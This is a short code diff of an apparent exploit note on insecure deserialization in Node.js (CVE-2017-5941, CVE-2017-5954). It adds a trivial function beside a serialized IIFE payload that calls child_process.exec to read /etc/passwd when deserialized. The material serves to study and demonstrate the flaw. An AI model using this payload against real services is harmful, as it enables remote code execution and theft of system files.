@@ -1,7 +1,10 @@
 // IIFEs and Insecure Object Deserialization
 // CVE-2017-5941, CVE-2017-5954
 // https://docs.google.com/document/d/1CaZ9f0_4itZ1W_oEntE_GHRhi8imPPBIYb1BVIQTTeM
-
+// function
+function(i) {
+  return i + 1;
+}
 // serialized payload
 {"payload":"_$$ND_FUNC$$_function(){require('child_process').exec('cat /etc/passwd'', function(error, stdout, stderr) {console.log(stdout) });}()"}
 
